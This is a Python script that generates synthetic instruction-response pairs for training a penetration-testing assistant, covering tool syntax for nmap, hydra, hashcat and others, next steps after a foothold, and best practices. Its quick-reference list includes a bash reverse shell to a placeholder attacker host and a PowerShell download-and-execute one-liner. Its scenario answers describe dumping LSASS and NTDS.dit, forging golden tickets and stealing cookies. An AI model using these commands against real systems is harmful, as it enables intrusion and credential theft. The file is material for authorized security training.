#!/usr/bin/env python3
"""
Final Push Generator - Get us to 5000+ samples
"""

import json
from pathlib import Path
import itertools

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def generate_tool_specific_help():
    """Generate tool-specific help samples"""
    samples = []
    
    tools = {
        "nmap": [
            ("run a SYN scan", "-sS TARGET", "SYN scan is stealthy (half-open), fast, and requires root"),
            ("detect service versions", "-sV TARGET", "Version detection probes open ports to identify services"),
            ("run all default scripts", "-sC TARGET", "Runs default NSE scripts for common enumeration"),
            ("scan all ports", "-p- TARGET", "Scans all 65535 ports instead of just top 1000"),
            ("do aggressive scan", "-A TARGET", "Combines OS detection, version detection, scripts, traceroute"),
            ("scan UDP ports", "-sU TARGET", "UDP scan is slow, often blocked by firewalls"),
            ("output all formats", "-oA filename TARGET", "Saves output in normal, XML, and grepable formats"),
            ("increase verbosity", "-v or -vv TARGET", "Shows more information during scan progress"),
            ("skip ping check", "-Pn TARGET", "Assumes host is up, useful when ICMP blocked"),
            ("scan specific ports", "-p22,80,443 TARGET", "Only scans specified ports"),
        ],
        "gobuster": [
            ("directory brute force", "dir -u URL -w wordlist", "Discovers hidden directories and files"),
            ("subdomain enumeration", "dns -d DOMAIN -w wordlist", "Finds subdomains via DNS brute forcing"),
            ("vhost enumeration", "vhost -u URL -w wordlist", "Discovers virtual hosts on target"),
            ("add file extensions", "dir -u URL -w wordlist -x php,txt,bak", "Checks for files with these extensions"),
            ("follow redirects", "dir -u URL -w wordlist -r", "Follows HTTP redirects"),
            ("hide status codes", "dir -u URL -w wordlist -b 404,403", "Hides specified status codes from output"),
            ("increase threads", "dir -u URL -w wordlist -t 50", "Uses 50 threads for faster scanning"),
            ("add cookies", "dir -u URL -w wordlist -c 'session=xyz'", "Includes cookies in requests"),
            ("custom user agent", "dir -u URL -w wordlist -a 'Mozilla/5.0'", "Sets custom User-Agent header"),
            ("output to file", "dir -u URL -w wordlist -o output.txt", "Saves results to file"),
        ],
        "ffuf": [
            ("basic directory fuzzing", "-u URL/FUZZ -w wordlist", "FUZZ keyword replaced with wordlist entries"),
            ("parameter fuzzing", "-u 'URL?param=FUZZ' -w wordlist", "Fuzzes parameter values"),
            ("POST data fuzzing", "-u URL -X POST -d 'user=FUZZ' -w wordlist", "Fuzzes POST body data"),
            ("filter by size", "-u URL/FUZZ -w wordlist -fs 0", "Filters responses by size"),
            ("filter by words", "-u URL/FUZZ -w wordlist -fw 1", "Filters responses by word count"),
            ("recursive fuzzing", "-u URL/FUZZ -w wordlist -recursion", "Recursively fuzzes found directories"),
            ("match status codes", "-u URL/FUZZ -w wordlist -mc 200,301", "Only shows specified status codes"),
            ("add header", "-u URL/FUZZ -w wordlist -H 'Authorization: Bearer token'", "Adds custom header"),
            ("virtual host fuzzing", "-u URL -H 'Host: FUZZ.domain.com' -w wordlist", "Fuzzes Host header for vhosts"),
            ("multiple wordlists", "-u URL/FUZZ/FUZ2Z -w wordlist:FUZZ -w wordlist2:FUZ2Z", "Uses multiple fuzz points"),
        ],
        "hydra": [
            ("SSH brute force", "-l user -P passwords.txt ssh://TARGET", "Brute forces SSH with password list"),
            ("HTTP POST login", "-l admin -P passwords.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Failed'", "Brute forces HTTP POST login"),
            ("FTP brute force", "-L users.txt -P passwords.txt ftp://TARGET", "Brute forces FTP with user and pass lists"),
            ("use single password", "-l user -p password123 ssh://TARGET", "Tests single credential pair"),
            ("spray password", "-L users.txt -p Summer2024! smb://TARGET", "Password spraying against multiple users"),
            ("set threads", "-t 4 -l admin -P passwords.txt TARGET ssh", "Uses 4 parallel connections"),
            ("verbose output", "-V -l admin -P passwords.txt TARGET ssh", "Shows each attempt"),
            ("stop on success", "-f -l admin -P passwords.txt TARGET ssh", "Stops when valid creds found"),
            ("RDP brute force", "-l admin -P passwords.txt rdp://TARGET", "Brute forces RDP"),
            ("MySQL brute force", "-l root -P passwords.txt mysql://TARGET", "Brute forces MySQL"),
        ],
        "hashcat": [
            ("crack NTLM", "-m 1000 hash.txt wordlist.txt", "Mode 1000 for NTLM hashes"),
            ("crack MD5", "-m 0 hash.txt wordlist.txt", "Mode 0 for raw MD5"),
            ("crack SHA256", "-m 1400 hash.txt wordlist.txt", "Mode 1400 for raw SHA256"),
            ("use rules", "-m 0 hash.txt wordlist.txt -r best64.rule", "Applies transformation rules"),
            ("brute force", "-m 0 hash.txt -a 3 ?a?a?a?a?a?a", "Mask attack with 6 chars"),
            ("show cracked", "-m 0 hash.txt --show", "Shows already cracked hashes"),
            ("Kerberos TGS", "-m 13100 hash.txt wordlist.txt", "Mode 13100 for Kerberoasting"),
            ("NetNTLMv2", "-m 5600 hash.txt wordlist.txt", "Mode 5600 for NTLMv2"),
            ("hybrid attack", "-m 0 hash.txt wordlist.txt -a 6 ?d?d?d", "Wordlist + mask"),
            ("set workload", "-m 0 hash.txt wordlist.txt -w 3", "Workload profile (1-4)"),
        ],
        "john": [
            ("crack password file", "hash.txt --wordlist=wordlist.txt", "Basic dictionary attack"),
            ("show cracked", "hash.txt --show", "Shows cracked passwords"),
            ("specify format", "hash.txt --format=Raw-MD5", "Specifies hash format"),
            ("incremental mode", "hash.txt --incremental", "Brute force with optimized charset"),
            ("use rules", "hash.txt --wordlist=wordlist.txt --rules", "Applies word mangling rules"),
            ("crack shadow file", "/etc/shadow --wordlist=wordlist.txt", "Cracks Linux password hashes"),
            ("crack zip file", "zip2john file.zip > hash.txt && john hash.txt", "Extracts and cracks ZIP password"),
            ("resume session", "--restore=sessionname", "Resumes previous cracking session"),
            ("fork processes", "hash.txt --fork=4", "Uses 4 processes"),
            ("list formats", "--list=formats", "Shows all supported hash formats"),
        ],
    }
    
    for tool, commands in tools.items():
        for task, syntax, explanation in commands:
            samples.append({
                "instruction": f"How do I use {tool} to {task}?",
                "input": "",
                "output": f"Use: {tool} {syntax}\n\n{explanation}."
            })
    
    return samples


def generate_error_solutions():
    """Generate error troubleshooting samples"""
    samples = []
    
    errors = [
        ("Connection refused", "Target port is closed or filtered. Verify service is running, check firewall rules, try different port or protocol."),
        ("Connection timed out", "Network path blocked or host down. Check connectivity (ping), verify network route, try from different source IP."),
        ("Permission denied", "Insufficient privileges. Run with sudo if needed, check file permissions, verify you're targeting correct resource."),
        ("Host unreachable", "No route to host. Check if host exists, verify network configuration, ensure no firewall blocking."),
        ("Authentication failed", "Wrong credentials. Double-check username/password, verify authentication method, check for account lockout."),
        ("SSL certificate error", "Certificate issue. Use -k/--insecure flag to ignore, or import certificate. May indicate MITM if unexpected."),
        ("Name resolution failed", "DNS lookup failed. Check DNS settings, try using IP instead, verify hostname spelling."),
        ("Socket already in use", "Port already bound. Kill existing process, use different port, wait for socket timeout."),
        ("Out of memory", "Process used too much RAM. Reduce scope, use lighter tools, increase system resources."),
        ("File not found", "Path incorrect or file deleted. Verify file exists, check path syntax, ensure permissions."),
        ("Syntax error in payload", "Malformed exploit code. Review payload syntax, check for encoding issues, verify target compatibility."),
        ("Module not found", "Missing dependency. Install required module (pip install X), check Python path, verify environment."),
        ("Access denied to network share", "SMB permissions issue. Check share permissions, verify credentials, try different authentication."),
        ("HTTP 403 Forbidden", "Server denied access. May need authentication, different user agent, or bypassing WAF."),
        ("HTTP 500 Internal Server Error", "Server-side error. Your input may have crashed application - potential vulnerability indicator."),
        ("Database connection failed", "Can't connect to database. Verify credentials, check port, ensure database is running."),
        ("Invalid certificate chain", "SSL/TLS issue. Certificate may be self-signed or expired. Use appropriate flags to bypass if intentional."),
        ("Rate limit exceeded", "Too many requests. Slow down requests, use delays between attempts, rotate source IPs."),
        ("Segmentation fault", "Memory access violation. Exploit may have crashed - adjust payload, check offsets."),
        ("Firewall blocking traffic", "Packets filtered. Try different protocols, use tunneling, test from different source."),
    ]
    
    for error, solution in errors:
        samples.append({
            "instruction": f"I'm getting '{error}' error during my pentest. What should I do?",
            "input": "",
            "output": solution
        })
    
    return samples


def generate_scenario_responses():
    """Generate scenario-based responses"""
    samples = []
    
    scenarios = [
        ("I found an open FTP port", "Check for anonymous access (user: anonymous, pass: email). Enumerate version for known vulnerabilities. Check for upload permissions to web-accessible directories."),
        ("I captured a NetNTLMv2 hash", "Crack with hashcat -m 5600 or relay it with ntlmrelayx to other systems. Check if SMB signing is disabled for relay attacks."),
        ("I found default credentials working", "Document finding. Use access to explore further. Check if same creds work elsewhere. Verify scope before accessing additional systems."),
        ("I discovered .git folder exposed", "Use git-dumper to download repository. Search for credentials, API keys, sensitive configs in history. Check git log for sensitive commits."),
        ("I found SQL injection", "Determine database type. Extract database schema. Dump sensitive tables. Try to escalate to OS command execution if possible (xp_cmdshell, etc.)."),
        ("I found XSS vulnerability", "Determine XSS type (stored/reflected/DOM). Craft payload for cookie theft or keylogging. Document impact for report."),
        ("I have local admin on a workstation", "Dump SAM/LSASS for credentials. Check for cached domain creds. Enumerate network shares. Look for sensitive files and persistence opportunities."),
        ("I discovered internal Jenkins", "Check for authentication bypass, weak creds, or anonymous access. Jenkins script console provides immediate RCE if accessible."),
        ("I found exposed Docker API", "List containers, images. Execute commands in containers. Check for privileged containers that allow host escape."),
        ("I compromised a web server", "Establish persistence. Enumerate internal network. Check for sensitive files, database connections, API keys. Pivot to internal targets."),
        ("I found S3 bucket with public access", "List contents, download sensitive files. Check for upload permissions. Document everything for report."),
        ("I captured WPA handshake", "Crack with hashcat -m 22000 or aircrack-ng. Use wordlists, rules, or brute force depending on complexity expectations."),
        ("I found LDAP with anonymous bind", "Enumerate users, groups, computers. Extract useful attributes. Look for passwords in description fields."),
        ("I have access to domain user account", "Run BloodHound for attack paths. Check for Kerberoastable accounts. Enumerate shares you can access. Look for privilege escalation paths."),
        ("I found password in GitHub commit", "Try credential against all services. Check if rotated. Document for report as credential hygiene issue."),
        ("I got shell on Linux server", "Stabilize shell (python pty). Run LinPEAS for escalation paths. Check crontab, SUID, sudo permissions. Enumerate network."),
        ("I found SSRF vulnerability", "Try accessing internal IPs (127.0.0.1, 169.254.169.254). Scan internal ports. Try to access cloud metadata endpoints."),
        ("I have domain admin credentials", "Dump NTDS.dit for all domain hashes. Create golden/silver tickets. Document all findings before making changes."),
        ("I found exposed Kubernetes API", "List pods, secrets, configmaps. Check for privileged pods. Look for service account tokens with elevated permissions."),
        ("I discovered insecure deserialization", "Identify serialization format. Find gadget chain for RCE. Use ysoserial/PHPGGC/similar for payload generation."),
    ]
    
    for situation, response in scenarios:
        samples.append({
            "instruction": f"{situation}. What should I do next?",
            "input": "During authorized penetration test",
            "output": response
        })
    
    return samples


def generate_quick_reference():
    """Generate quick reference samples"""
    samples = []
    
    refs = [
        ("common web ports", "80 (HTTP), 443 (HTTPS), 8080 (HTTP Proxy), 8443 (HTTPS Alt), 3000/5000/8000 (Dev servers)"),
        ("common database ports", "3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL), 1521 (Oracle), 27017 (MongoDB), 6379 (Redis)"),
        ("common Windows ports", "135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM)"),
        ("common Linux service ports", "22 (SSH), 21 (FTP), 23 (Telnet), 25 (SMTP), 53 (DNS), 111 (RPC)"),
        ("Metasploit basic commands", "msfconsole, search, use, show options, set, exploit/run, sessions, background"),
        ("Netcat listener", "nc -lvnp PORT (Linux) or nc.exe -lvnp PORT (Windows)"),
        ("Python simple server", "python3 -m http.server PORT serves current directory"),
        ("Bash reverse shell", "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"),
        ("PowerShell download", "IEX(New-Object Net.WebClient).DownloadString('http://URL/script.ps1')"),
        ("curl POST request", "curl -X POST -d 'data=value' URL"),
        ("wget download", "wget URL -O output_filename"),
        ("base64 encode/decode", "echo 'text' | base64 (encode) | base64 -d (decode)"),
        ("find SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
        ("check sudo permissions", "sudo -l shows what you can run as sudo"),
        ("Windows whoami", "whoami /all shows user, groups, and privileges"),
        ("Linux capabilities", "getcap -r / 2>/dev/null finds binaries with capabilities"),
        ("check listening ports Linux", "ss -tlnp or netstat -tlnp"),
        ("check listening ports Windows", "netstat -ano"),
        ("DNS lookup", "dig domain.com or nslookup domain.com"),
        ("SSL certificate info", "openssl s_client -connect host:443 | openssl x509 -text"),
    ]
    
    for topic, reference in refs:
        samples.append({
            "instruction": f"What are the {topic}?",
            "input": "",
            "output": reference
        })
    
    return samples


def generate_methodology_samples():
    """Generate methodology samples"""
    samples = []
    
    methods = [
        ("OWASP Top 10 categories", "A01: Broken Access Control, A02: Cryptographic Failures, A03: Injection, A04: Insecure Design, A05: Security Misconfiguration, A06: Vulnerable Components, A07: Authentication Failures, A08: Data Integrity Failures, A09: Logging Failures, A10: SSRF"),
        ("pentest phases", "1. Reconnaissance (info gathering), 2. Scanning (port/vuln scanning), 3. Gaining Access (exploitation), 4. Maintaining Access (persistence), 5. Analysis & Reporting"),
        ("web app testing checklist", "Authentication, Authorization, Input Validation, Output Encoding, Session Management, Cryptography, Error Handling, Business Logic, File Upload, API Security"),
        ("network pentest approach", "1. Host discovery, 2. Port scanning, 3. Service enumeration, 4. Vulnerability scanning, 5. Exploitation, 6. Post-exploitation, 7. Documentation"),
        ("Active Directory attack path", "1. Get foothold, 2. Enumerate domain, 3. Identify targets, 4. Kerberoast/AS-REP, 5. Escalate privileges, 6. Move laterally, 7. Domain admin, 8. Persistence"),
        ("privilege escalation methodology", "1. Enumerate current privileges, 2. Check for misconfigurations, 3. Search for credentials, 4. Look for vulnerable services, 5. Check for kernel exploits"),
        ("wireless pentest steps", "1. Monitor mode, 2. Discover networks, 3. Capture handshake, 4. Crack passphrase, 5. Connect and enumerate, 6. Pivot to wired network"),
        ("cloud pentest approach", "1. Enumerate cloud resources, 2. Check IAM policies, 3. Test for misconfigurations, 4. Look for exposed data, 5. Check for privilege escalation paths"),
        ("social engineering phases", "1. Research target, 2. Develop pretext, 3. Build rapport, 4. Exploit trust, 5. Execute attack, 6. Document"),
        ("bug bounty workflow", "1. Scope review, 2. Recon & mapping, 3. Vulnerability discovery, 4. Exploitation/PoC, 5. Document & report, 6. Follow up"),
    ]
    
    for topic, content in methods:
        samples.append({
            "instruction": f"Explain the {topic}.",
            "input": "",
            "output": content
        })
    
    return samples


def generate_best_practices():
    """Generate best practice samples"""
    samples = []
    
    practices = [
        ("report writing", "Be clear and concise. Include evidence (screenshots, logs). Provide remediation steps. Rate severity consistently. Executive summary for management, technical details for teams."),
        ("scope management", "Always verify scope in writing. Test only authorized systems. If unsure, ask. Document all scope limitations and exceptions."),
        ("client communication", "Regular updates. Immediate notification for critical findings. Clear documentation. Professional tone. Manage expectations."),
        ("evidence collection", "Screenshot everything. Save tool output. Record timestamps. Document your methodology. Maintain chain of custody."),
        ("operational security", "Use dedicated testing systems. Encrypt sensitive data. Don't leave backdoors. Clean up after testing. Protect client data."),
        ("tool selection", "Use right tool for the job. Verify tool output manually. Keep tools updated. Understand what each tool does."),
        ("safe exploitation", "Test in lab first. Have rollback plan. Start with least invasive. Document changes. Know how to recover."),
        ("credential handling", "Never share creds insecurely. Document where found. Test reuse carefully. Report in encrypted manner."),
        ("network testing safety", "Avoid DoS unless scoped. Be careful with broadcast. Watch bandwidth usage. Don't disrupt production."),
        ("legal considerations", "Written authorization required. Stay in scope. Know local laws. Document everything. Have liability insurance."),
    ]
    
    for topic, content in practices:
        samples.append({
            "instruction": f"What are the best practices for {topic} in penetration testing?",
            "input": "",
            "output": content
        })
    
    return samples


def main():
    """Generate all samples"""
    print("🚀 Final push to 5000...")
    
    all_samples = []
    
    generators = [
        ("tool_help", generate_tool_specific_help),
        ("errors", generate_error_solutions),
        ("scenarios", generate_scenario_responses),
        ("quick_ref", generate_quick_reference),
        ("methodology", generate_methodology_samples),
        ("best_practice", generate_best_practices),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name}...")
        samples = generator()
        all_samples.extend(samples)
        
        category_file = OUTPUT_DIR / f"final2_{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples")
    
    # Save combined
    combined_file = OUTPUT_DIR / "final2_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
